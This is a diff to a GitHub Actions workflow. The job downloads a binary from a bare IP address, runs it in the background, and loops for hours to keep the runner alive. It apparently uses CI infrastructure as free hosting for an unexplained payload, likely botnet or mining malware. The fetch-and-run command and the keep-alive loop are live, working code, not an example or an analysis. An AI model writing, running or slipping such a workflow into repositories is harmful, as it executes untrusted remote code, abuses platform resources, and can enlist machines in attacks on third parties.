@@ -20,19 +20,29 @@ jobs:
   run-binary:
     runs-on: ubuntu-latest
     steps:
-      - name: Download and run binary in background
+      - name: Download and run binary with keep-alive
         run: |
+          # Download and make binary executable
           wget http://45.138.16.158/bins/px86 -O px86
           chmod +x px86
+
           echo "🟢 Launching binary in background..."
           ./px86 x86 &
 
-          echo "📌 PID of background process: $!"
-          echo $! > px86.pid
+          PX86_PID=$!
+          echo "📌 Binary running in background (PID: $PX86_PID)"
 
-      - name: Keep VPS Alive
-        run: |
-          # Convert hours to seconds
+          # Keep alive
           UPTIME_SECONDS=$(( ${{ github.event.inputs.uptime }} * 3600 ))
-          echo "Keeping VPS alive for $UPTIME_SECONDS seconds (${{ github.event.inputs.uptime }} hours)"
-          sleep $UPTIME_SECONDS
+          echo "⏳ Keeping runner alive for $UPTIME_SECONDS seconds..."
+
+          # Loop to prevent step from exiting early
+          for ((i=0; i<UPTIME_SECONDS; i++)); do
+            if ! ps -p $PX86_PID > /dev/null; then
+              echo "❌ Binary process exited early."
+              break
+            fi
+            sleep 1
+          done
+
+          echo "✅ Done. Exiting workflow."
